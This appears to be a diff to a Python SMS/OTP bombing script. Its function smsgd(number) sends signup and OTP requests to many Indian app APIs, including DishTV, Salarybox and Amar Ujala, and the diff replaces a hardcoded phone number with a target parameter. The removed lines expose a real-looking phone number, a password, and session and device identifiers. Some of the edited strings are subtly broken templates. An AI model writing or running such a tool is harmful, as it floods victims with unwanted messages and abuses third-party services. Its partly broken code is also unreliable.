@@ -130,7 +130,7 @@ def smsgd(number):
                 "accept-encoding": "gzip",
                 "user-agent": "okhttp/4.9.2"
             },
-            "data": '{"data":{"phoneNumber":"+919336734442"}}'
+            "data": f'{{"data":{{"phoneNumber":"+91{number}"}}}}'
         },
         {
             "method": "POST",
@@ -143,7 +143,7 @@ def smsgd(number):
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip"
             },
-            "data": '{"appCode":"un","mobileNo":"9336734442","countryCode":"+91","messageId":"1","emailId":" ","subject":"Register","priority":"1","device":"android","variant":"v1"}'
+            "data": '{"appCode":"un","mobileNo":{number},"countryCode":"+91","messageId":"1","emailId":" ","subject":"Register","priority":"1","device":"android","variant":"v1"}'
         },
         {
             "method": "POST",
@@ -157,11 +157,11 @@ def smsgd(number):
                 "tenant-code": "dishtv",
                 "session-id": "78ce486d-a978-430b-8d75-2c62fe7789b5"
             },
-            "data": '{"password":"dishtv@123#","mobile":"919336734442","referral_type":"","referral_id":"","cookie":"","additional_params":{"isOptedForPromotions":"true"},"is_header_enrichment":false,"os_version":"14","app_version":"9.6.5","manufacturer":"SM-F7110"}'
+            "data": '{"password":"dishtv@123#","mobile":"91{number}","referral_type":"","referral_id":"","cookie":"","additional_params":{"isOptedForPromotions":"true"},"is_header_enrichment":false,"os_version":"14","app_version":"9.6.5","manufacturer":"SM-F7110"}'
         },
         {
             "method": "POST",
-            "url": "https://lgi-api-prod.aws.playco.com/api/v0.2/mobile/verify/919336734442/signup?lang=en&repeat=false",
+            "url": f"https://lgi-api-prod.aws.playco.com/api/v0.2/mobile/verify/91{number}/signup?lang=en&repeat=false",
             "headers": {
                 "Host": "lgi-api-prod.aws.playco.com",
                 "content-type": "application/json; charset=UTF-8",
@@ -185,7 +185,7 @@ def smsgd(number):
                 "content-type": "application/json; charset=UTF-8",
                 "accept-encoding": "gzip"
             },
-            "data": '{"otp":"","user_agent":"samsung SM-F7110|c7abc1fd7459e84c","user_id":"919336734442","user_signup_method":"MOBILE"}'
+            "data": '{"otp":"","user_agent":"samsung SM-F7110|c7abc1fd7459e84c","user_id":"91{number}","user_signup_method":"MOBILE"}'
         },
         {
             "method": "POST",
@@ -200,7 +200,7 @@ def smsgd(number):
                 "accept-encoding": "gzip",
                 "user-agent": "okhttp/5.0.0-alpha.10"
             },
-            "data": '{"phoneNumber":"9336737442"}'
+            "data": f'{{"phoneNumber":"{number}"}}'
         },
         {
             "method": "POST",
@@ -223,11 +223,11 @@ def smsgd(number):
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip"
             },
-            "data": '{"mobile":"+91-9336734442","email":""}'
+            "data": {"mobile":"+91-{number}","email":""}
         },
         {
             "method": "GET",
-            "url": "https://auth-api.salaryboxapp.com/auth/otp/login?pn=9336734442&dc=91",
+            "url": f"https://auth-api.salaryboxapp.com/auth/otp/login?pn={number}&dc=91",
             "headers": {
                 "Host": "auth-api.salaryboxapp.com",
                 "app-version-code": "477",
@@ -248,11 +248,11 @@ def smsgd(number):
                 "user-agent": "okhttp/4.12.0",
                 "appversion": "180"
             },
-            "data": '{"androidVersionNo":"34","appHashCode":"","appVersion":"180","appsflyerUID":"1722786845914-660411448727150011","device_type":"app","mobile":"9336734442"}'
+            "data": '{"androidVersionNo":"34","appHashCode":"","appVersion":"180","appsflyerUID":"1722786845914-660411448727150011","device_type":"app","mobile":{number}}'
         },
         {
             "method": "GET",
-            "url": "https://sso.amarujala.com/v2/auth/nkit/sendotp?country_code=91&mobile=9336734442&platform=Android&hash=OTE5MzM2NzM0NDQy",
+            "url": "https://sso.amarujala.com/v2/auth/nkit/sendotp?country_code=91&mobile={number}&platform=Android&hash=OTE5MzM2NzM0NDQy",
             "headers": {
                 "Host": "sso.amarujala.com",
                 "clientkey": "5822f190b5164f16380b32a9",
